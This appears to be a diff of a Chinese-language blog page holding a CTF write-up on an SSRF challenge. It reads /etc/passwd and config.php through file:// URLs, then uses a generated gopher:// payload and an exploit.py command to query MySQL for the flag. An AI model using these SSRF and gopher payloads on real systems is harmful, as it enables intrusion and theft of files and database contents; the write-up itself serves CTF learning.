@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">501</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">565</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -399,27 +399,27 @@ height:50vh;
         <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目链接：<a href="http://35.190.142.60/" target="_blank" rel="noopener">http://35.190.142.60/</a></p>
 <p>打开题目是个curl的界面，可以想到是SSRF</p>
 <p><img src="/2018/07/31/Gopher/1.png" alt="Gopher"></p>
-<p>右键打开源代码发现<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- index.php?debug=1--&gt;</span><br></pre></td></tr></table></figure></p>
-<p>于是访问请求<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://35.190.142.60/?debug=1</span><br></pre></td></tr></table></figure></p>
-<p>得到页面源代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $content_url = getUrlContent($url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    $content_url = <span class="string">""</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> $content_url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>根据代码，考察的是文件读取，读源代码,尝试：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p>右键打开源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?debug=1--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>于是访问请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.190.142.60/?debug=1</span><br></pre></td></tr></table></figure></p>
+<p>得到页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $content_url = getUrlContent($url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    $content_url = <span class="string">""</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> $content_url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>根据代码，考察的是文件读取，读源代码,尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure></p>
 <p>发现回显</p>
 <p><img src="/2018/07/31/Gopher/2.png" alt="Gopher"></p>
 <p>于是发现必须得有localhost的host</p>
-<p>于是改变请求方式为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://loaclhost/etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p>有回显，继续尝试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://localhost/var/www/html/config.php</span><br></pre></td></tr></table></figure></p>
-<p>成功得到源码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hosts = <span class="string">"localhost"</span>;</span><br><span class="line">$dbusername = <span class="string">"ssrf_user"</span>;</span><br><span class="line">$dbpasswd = <span class="string">""</span>;</span><br><span class="line">$dbname = <span class="string">"ssrf"</span>;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span><br><span class="line">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($tmpurl);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $url = safe($url);</span><br><span class="line">    $url = escapeshellarg($url);</span><br><span class="line">    $pl = <span class="string">"curl "</span>.$url;</span><br><span class="line">    <span class="keyword">echo</span> $pl;</span><br><span class="line">    $content = shell_exec($pl);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>于是改变请求方式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://loaclhost/etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p>有回显，继续尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://localhost/var/www/html/config.php</span><br></pre></td></tr></table></figure></p>
+<p>成功得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hosts = <span class="string">"localhost"</span>;</span><br><span class="line">$dbusername = <span class="string">"ssrf_user"</span>;</span><br><span class="line">$dbpasswd = <span class="string">""</span>;</span><br><span class="line">$dbname = <span class="string">"ssrf"</span>;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span><br><span class="line">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($tmpurl);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $url = safe($url);</span><br><span class="line">    $url = escapeshellarg($url);</span><br><span class="line">    $pl = <span class="string">"curl "</span>.$url;</span><br><span class="line">    <span class="keyword">echo</span> $pl;</span><br><span class="line">    $content = shell_exec($pl);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>通过代码可以看出mysql的存在，以及简单的url。</p>
 <p>这里考察是gopher打mysql</p>
-<p>测试：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher://localhost:3306</span><br></pre></td></tr></table></figure></p>
+<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:3306</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/07/31/Gopher/3.png" alt="Gopher"></p>
 <p>思路争取使用payload生成脚本</p>
-<p>命令为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exploit.py -u ssrf_user -d &apos;ssrf&apos; -P &apos;SELECT * FROM ssrf.flag&apos; -v</span><br></pre></td></tr></table></figure></p>
+<p>命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -u ssrf_user -d &apos;ssrf&apos; -P &apos;SELECT * FROM ssrf.flag&apos; -v</span><br></pre></td></tr></table></figure></p>
 <p>生成payload:</p>
 <pre><code>gopher://127.0.0.1:3306/A0%00%00%01O%B7%00%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00ssrf%00V%01%00%00%03select%20concat%28cast%280x504b03040a00000000000000000000000000e8030000e803000010000000746869735f69735f7468655f666c6167%20as%20binary%29%2C%20rpad%28%28SELECT%20%2A%20FROM%20ssrf.flag%29%2C%201000%2C%20%27-%27%29%2C%20cast%280x504b01021e030a00000000000000000000000000100000000000000000000000000000000000746869735f69735f7468655f666c6167504b0506000000000100010036000000640000000000%20as%20binary%29%29%00%00%00%00
 </code></pre><p>发送请求即可得到flag</p>
 <p><img src="/2018/07/31/Gopher/4.png" alt="Gopher"></p>
-<h2 id="Gopher攻击mysql"><a href="#Gopher攻击mysql" class="headerlink" title="Gopher攻击mysql"></a>Gopher攻击mysql</h2><p>exploit.py的项目地址：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://github.com/undefinedd/extract0r-</span><br></pre></td></tr></table></figure></p>
+<h2 id="Gopher攻击mysql"><a href="#Gopher攻击mysql" class="headerlink" title="Gopher攻击mysql"></a>Gopher攻击mysql</h2><p>exploit.py的项目地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/undefinedd/extract0r-</span><br></pre></td></tr></table></figure></p>
 <p>在windows下运行不了，放在ubuntu18.04里可以运行。</p>
 <p>参考文章：<a href="http://www.freebuf.com/articles/web/159342.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/159342.html</a></p>
 <p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
@@ -958,38 +958,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 29
@@ -1002,20 +970,6 @@ top:50vh;
     
     
     
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
@@ -1151,6 +1105,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/rsa/" >Crypto_RSA算法总结</a>
         </li>
@@ -1167,9 +1144,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
